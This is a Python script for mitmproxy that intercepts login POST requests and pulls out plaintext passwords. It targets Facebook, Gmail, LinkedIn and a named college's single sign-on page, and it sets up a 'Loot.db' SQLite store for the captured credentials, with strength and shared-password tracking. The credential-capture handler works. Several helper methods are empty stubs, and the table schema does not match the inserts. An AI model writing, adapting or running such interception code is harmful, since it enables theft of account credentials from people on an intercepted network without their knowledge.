import mitmproxy, sqlite3, random

class MITM_Interface:

	def __init__(self):
		self.dbName = "Loot.db"
		self.connex = sqlite3.connect(self.dbName)
		self.cur = self.connex.cursor()
		self.cpu_factor = 0

	def tableA_vals(self, user_id, pword_id, associated_account, password_length, strength):
		return {"user_id" : user_id,
		"pword_id" : pword_id,
		"associated_account" : associated_account,
		"password_length" : password_length,
		"strength" : strength}

	def tableB_vals(self,user_id, number_shared_passwords):
		return {"user_id" : user_id,
		"number_shared_passwords" : number_shared_passwords}

	def assign_strength(self, password):
		'''assigns a password a "strength" value determined by: 
		# of permutations of characters, 
		password length, 
		distribution of unique characters,
		self.cpu_factor (approximate cpu clockspeed)

		--> number of years to crack?
		'''
		pass

	def new_user_id(self):
		pass

	def check_for_shared_passwords(self):
		'''checks traffic for shared passwords'''
		pass

	def read_traffic(self, account, password):
		'''makes decisions based on account names and passwords from mitmproxy : inserts into table(s), makes a new userID, etc'''
		self.check_for_shared_passwords()
		pass

	def initTableA(self):
		query = 'CREATE TABLE IF NOT EXISTS TableA' \
				'(user_id TEXT PRIMARY KEY NOT NULL,' \
				'pword_id TEXT UNIQUE NOT NULL,' \
				'associated_account TEXT NOT NULL,' \
				'strength INTEGER NOT NULL)'
		self.cur.execute(query)
		self.connex.commit()

	def insert_into_tables(self, user_id, pword_id, associated_account, password_length, strength, number_shared_passwords):
		try:
			self.cur.execute("INSERT OR IGNORE INTO TableA VALUES (?,?,?,?,?)", [user_id, pword_id, associated_account, password_length, strength])
			self.connex.commit()
			self.cur.execute("INSERT OR IGNORE INTO TableB VALUES (?,?)", [user_id, number_shared_passwords])
			self.connex.commit()
			print("successfully inserted records into tables...")
		except sqlite3.Error as SQE:
			print("error inserting record:", SQE)
			pass

	def initTableB(self):
		query = 'CREATE TABLE IF NOT EXISTS TableB' \
				'(user_id TEXT PRIMARY KEY NOT NULL,' \
				'number_shared_passwords INTEGER NOT NULL)'
		self.cur.execute(query)
		self.connex.commit()


	def view_db(self):
		print("Current stored passwords:")
		try:
			table_a = self.cur.execute('SELECT * FROM TableA')
			table_a = self.cur.fetchall()
			table_b = self.cur.execute('SELECT * FROM TableB')
			table_b = self.cur.fetchall()
			self.connex.commit()
			i, j = 1, 1
			for row in table_a:
				print(str(i), ">", "| USER_ID:", row[0], "| PWORD_ID:", row[1], "| ASSOCIATED_ACCOUNT:", row[2], "| STRENGTH:", row[3], "|","| BRUTEFORCE_FACTOR:", row[4])
				i +=1
			print("//////////////////")
			for row in table_b:
				print(str(i), ">", "| USER_ID:", row[0],"| NUMBER_SHARED_PASSWORDS:", row[1])
				j +=1
		except UnicodeEncodeError:
			print("error printing tables")
			pass
		except sqlite3.OperationalError as SQE:
			print("error selecting from a table: ", SQE)
			pass



class Get_Pwords:

	def request(self,flow):
		'''
		MITM_Interface instantiated here 
		--> picks account name, passwords from mitmproxy traffic
		'''
		#mitm_script = MITM_Interface()
		if flow.request.urlencoded_form and flow.request.method == 'POST':
			form = flow.request.urlencoded_form
			try:
				if "pass" in form and "login_try_number" in flow.request.pretty_url:
					print("account: Facebook, password:", form['pass'])
				elif "Passwd" in form and form['Page'] == "PasswordSeparationSignIn" and "/signin/challenge/sl/password" in flow.request.pretty_url:
					print("account: Gmail, password:", form['Passwd'])
				elif "cas.coloradocollege.edu" in flow.request.pretty_url and form['password']:
					print("account: CC SSI, password:", form['password'])
				elif "linkedin.com" in flow.request.pretty_url and form['session_password']:
					print("account: Linkedin, password:", form['session_password'])
			except KeyError:
				print("error supressed: key not in urlencoded_form")
				pass

def start():
	return Get_Pwords()
